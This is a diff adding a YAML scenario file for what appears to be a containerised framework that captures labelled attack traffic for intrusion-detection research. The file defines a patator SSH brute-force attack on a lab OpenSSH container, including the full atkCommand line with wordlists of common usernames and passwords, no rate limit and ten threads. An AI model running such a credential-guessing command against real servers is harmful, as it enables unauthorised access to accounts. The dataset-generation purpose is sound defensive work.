@@ -1,0 +1,44 @@
+uuid: 3f4cb598-0393-4bed-a30b-35f2c0dd4bd9
+name: patator-ssh-cic-t10-p
+startTime: 2025-03-11T16:16:50.323691235+01:00
+stopTime: 2025-03-11T16:28:32.753718887+01:00
+attacker:
+  name: patator
+  image: ghcr.io/idlab-discover/concap/patator:cic
+  atkCommand: python3 patator.py ssh_login host=$TARGET_IP user=FILE0 password=FILE1
+    0=/usr/share/wordlists/top-usernames-shortlist.txt 1=/usr/share/wordlists/2023-200_most_used_passwords.txt
+    persistent=1 --rate-limit=0 --threads=10 -x ignore:mesg='Authentication failed'
+    2>&1 | tee -a /proc/1/fd/1
+  atkTime: ""
+  cpuRequest: 1500m
+  cpuLimit: ""
+  memRequest: 500Mi
+  memLimit: ""
+target:
+  name: openssh-server
+  image: ghcr.io/idlab-discover/concap/openssh-server:cic-1.0.0
+  filter: ((dst host $ATTACKER_IP and src host $TARGET_IP) or (dst host $TARGET_IP
+    and src host $ATTACKER_IP)) and not arp
+  cpuRequest: 500m
+  cpuLimit: ""
+  memRequest: 500Mi
+  memLimit: ""
+network:
+  bandwidth: 100mbit
+  queueSize: 100ms
+  limit: "10000"
+  delay: 0ms
+  jitter: 0ms
+  distribution: normal
+  loss: 0%
+  corrupt: 0%
+  duplicate: 0%
+  seed: "0"
+labels:
+  category: bruteforce-ssh
+  label: "1"
+  scenario: patator_ssh_cic_T10_P
+  subcategory: patator
+deployment:
+  attacker: 192.168.19.139
+  target: 192.168.249.84
